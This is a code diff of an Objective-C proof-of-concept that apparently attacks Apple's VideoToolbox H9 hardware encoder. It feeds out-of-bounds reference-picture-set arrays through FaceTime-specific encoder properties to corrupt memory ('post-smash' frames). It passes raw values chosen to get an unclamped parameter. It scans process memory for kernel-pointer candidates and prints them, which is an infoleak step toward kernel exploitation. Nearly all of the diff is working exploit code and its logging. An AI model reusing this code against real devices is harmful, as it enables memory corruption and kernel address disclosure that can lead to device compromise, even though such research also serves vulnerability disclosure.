@@ -894,29 +894,22 @@ static NSString *KPH9RunTimed(NSString *label, int64_t timeoutMs, BOOL *outTimed
 
         VTSessionSetProperty(s, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
         VTSessionSetProperty(s, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
+        VTSessionSetProperty(s, CFSTR("ForceSliceRPS"), kCFBooleanTrue);
         KPH9PrimeRealTime(s);
+
+        // H9 expects flat CFArray<CFNumber *> for UserRPSForFaceTime (NSArray<NSDictionary *>
+        // returns -12912 kVTPropertyNotSupportedErr) and latches @pre before PrepareToEncodeFrames.
+        NSArray *rpsSaneFlat = @[ @1, @0, @1, @0 ];
+        NSMutableArray *rpsOOBFlat = [NSMutableArray arrayWithCapacity:64];
+        for (int i = 0; i < 64; i++) {
+            [rpsOOBFlat addObject:@((i & 1) == 0 ? (i / 2 + 1) : 0)];
+        }
+
+        OSStatus stSane = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rpsSaneFlat);
+        OSStatus stOOB  = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rpsOOBFlat);
         OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
-        KPH9OutAppend(out, @"  prepare -> %d\n", (int)prep);
-
-        NSMutableArray *s0s = [NSMutableArray array], *s1s = [NSMutableArray array];
-        for (int i = 0; i < 2; i++) { [s0s addObject:@(i)]; [s1s addObject:@0]; }
-        NSDictionary *rpsSane = @{
-            @"AbsDeltaRPSMinus1": s0s, @"DeltaRPSSign": s1s,
-            @"NumNegativePics": @2, @"NumPositivePics": @0,
-            @"UsedByCurrPicS0": @3U, @"UsedByCurrPicS1": @0U,
-        };
-
-        NSMutableArray *s0oob = [NSMutableArray array], *s1oob = [NSMutableArray array];
-        for (int i = 0; i < 32; i++) { [s0oob addObject:@(i)]; [s1oob addObject:@0]; }
-        NSDictionary *rpsOOB = @{
-            @"AbsDeltaRPSMinus1": s0oob, @"DeltaRPSSign": s1oob,
-            @"NumNegativePics": @32, @"NumPositivePics": @32,
-            @"UsedByCurrPicS0": @0xFFFFFFFFU, @"UsedByCurrPicS1": @0xFFFFFFFFU,
-        };
-
-        OSStatus stSane = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsSane]);
-        OSStatus stOOB  = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsOOB]);
-        KPH9OutAppend(out, @"  session set UserRPS @pre sane(2+0)=%d ext(32+32)=%d\n", (int)stSane, (int)stOOB);
+        KPH9OutAppend(out, @"  session set UserRPS @pre sane(x4)=%d oob(x64)=%d prepare=%d\n",
+                      (int)stSane, (int)stOOB, (int)prep);
 
         CVPixelBufferRef pb = KPH9CreatePixelBuffer(1280, 720);
         if (pb) {
@@ -925,26 +918,23 @@ static NSString *KPH9RunTimed(NSString *label, int64_t timeoutMs, BOOL *outTimed
             if (e0 == noErr) KPH9Drain(cbSink, 1, 60);
             NSString *cb0 = nil;
             @synchronized (cbSink) { cb0 = cbSink.firstObject ?: @"(no cb)"; [cbSink removeAllObjects]; }
-            OSStatus stSanePost = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsSane]);
+            OSStatus stSanePost = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rpsSaneFlat);
             KPH9OutAppend(out, @"  encode[0] clean IDR -> %d (%@) | set UserRPS @post-idr=%d\n",
                           (int)e0, cb0, (int)stSanePost);
 
             NSDictionary *fp = @{
-                @"UserRPSForFaceTime": @[rpsOOB],
-                @"AbsDeltaRPSMinus1": s0oob,
-                @"DeltaRPSSign": s1oob,
+                @"UserRPSForFaceTime": rpsOOBFlat,
+                @"ForceSliceRPS": @YES,
             };
             OSStatus e1 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(1, 30), kCMTimeInvalid,
                                                           (__bridge CFDictionaryRef)fp, NULL, NULL);
-            if (e1 == noErr) KPH9Drain(cbSink, 1, 80);
-
-            // Push 4 clean P-frames (pts 2..5) so pts=1 and pts=2..3 exit any 3-frame lookahead window
-            // without calling VTCompressionSessionCompleteFrames.
+            // Push 4 trailing P-frames (pts 2..5) BEFORE draining so pts=1 exits the
+            // 4-frame HEVC B-pyramid reorder window instead of returning (no cb).
             OSStatus e2 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(2, 30), kCMTimeInvalid, NULL, NULL, NULL);
             OSStatus e3 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(3, 30), kCMTimeInvalid, NULL, NULL, NULL);
             VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(4, 30), kCMTimeInvalid, NULL, NULL, NULL);
             VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(5, 30), kCMTimeInvalid, NULL, NULL, NULL);
-            if (e2 == noErr || e3 == noErr) KPH9Drain(cbSink, 2, 120);
+            if (e1 == noErr || e2 == noErr || e3 == noErr) KPH9Drain(cbSink, 2, 160);
             NSString *cb1 = nil, *cb2 = nil;
             @synchronized (cbSink) {
                 cb1 = cbSink.firstObject ?: @"(no cb)";
@@ -955,7 +945,7 @@ static NSString *KPH9RunTimed(NSString *label, int64_t timeoutMs, BOOL *outTimed
                     cb2 = @"(no cb)";
                 }
             }
-            KPH9OutAppend(out, @"  encode[1] frameProps RPS(32+32) -> %d (%@)\n", (int)e1, cb1);
+            KPH9OutAppend(out, @"  encode[1] frameProps RPS(x64) -> %d (%@)\n", (int)e1, cb1);
             KPH9OutAppend(out, @"  encode[2..3] post-smash P-frames -> %d/%d (%@)\n", (int)e2, (int)e3, cb2);
             CVPixelBufferRelease(pb);
         }
@@ -1024,8 +1014,8 @@ static NSString *KPH9RunTimed(NSString *label, int64_t timeoutMs, BOOL *outTimed
             }
 
             KPH9OutAppend(out, @"  [2B: raw EncoderUsage=1 without BaseLayerFrameRate -> unclamped NTL]\n");
-            int rawVals[] = { 3, 8, 16000, 16447, 16463 };
-            for (int i = 0; i < 5; i++) {
+            int rawVals[] = { 3, 8, 16000, 16444, 16447, 16462 };
+            for (int i = 0; i < 6; i++) {
                 int ntl = rawVals[i];
                 uint64_t x0 = ((uint64_t)(uint32_t)(ntl - 16463) << 32) | 0x59ULL;
                 VTCompressionSessionRef s = NULL;
@@ -1190,8 +1180,12 @@ static NSString *KPH9RunTimed(NSString *label, int64_t timeoutMs, BOOL *outTimed
     vm_region_submap_info_data_64_t info;
     mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
     uint64_t pageBuf[512];
+    vm_address_t exclAddr = (vm_address_t)pageBuf;
+    vm_size_t exclSize = sizeof(pageBuf);
     int candidates = 0;
-    for (int iter = 0; iter < 160 && candidates < 64; iter++) {
+    uint64_t sampleCands[8] = {0};
+    int sampleCount = 0;
+    for (int iter = 0; iter < 4096 && candidates < 64; iter++) {
         count = VM_REGION_SUBMAP_INFO_COUNT_64;
         if (vm_region_recurse_64(mach_task_self(), &addr, &size, &depth,
                                  (vm_region_recurse_info_t)&info, &count) != KERN_SUCCESS || size == 0) {
@@ -1201,10 +1195,10 @@ static NSString *KPH9RunTimed(NSString *label, int64_t timeoutMs, BOOL *outTimed
             depth++;
             continue;
         }
-        if ((info.protection & (VM_PROT_READ | VM_PROT_WRITE)) == (VM_PROT_READ | VM_PROT_WRITE) &&
-            size <= 8 * 1024 * 1024 &&
-            !KPVMShouldSkipRegion(&info, addr, size, &depth, NULL, NULL, 0)) {
-            vm_size_t maxBytes = (size < 16384) ? size : 16384;
+        if ((info.protection & VM_PROT_READ) != 0 &&
+            size <= 16 * 1024 * 1024 &&
+            !KPVMShouldSkipRegion(&info, addr, size, &depth, &exclAddr, &exclSize, 1)) {
+            vm_size_t maxBytes = (size < 65536) ? size : 65536;
             for (vm_size_t off = 0; off + sizeof(pageBuf) <= maxBytes && candidates < 64; off += sizeof(pageBuf)) {
                 vm_size_t outSz = 0;
                 if (vm_read_overwrite(mach_task_self(), addr + off, sizeof(pageBuf),
@@ -1216,6 +1210,7 @@ static NSString *KPH9RunTimed(NSString *label, int64_t timeoutMs, BOOL *outTimed
                 for (size_t w = 0; w < words && candidates < 64; w++) {
                     uint64_t v = pageBuf[w];
                     if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
+                        if (sampleCount < 8) sampleCands[sampleCount++] = v;
                         candidates++;
                     }
                 }
@@ -1225,6 +1220,9 @@ static NSString *KPH9RunTimed(NSString *label, int64_t timeoutMs, BOOL *outTimed
         addr += size;
     }
     [report appendFormat:@"  filtered kernel pointer candidates: %d\n", candidates];
+    for (int si = 0; si < sampleCount; si++) {
+        [report appendFormat:@"    cand[%d] = 0x%016llx\n", si, sampleCands[si]];
+    }
 
     // -------------------------------------------------------------------------
     // Stage 6: XPC bitstream / NAL / attachments leak + exact DPB boundary
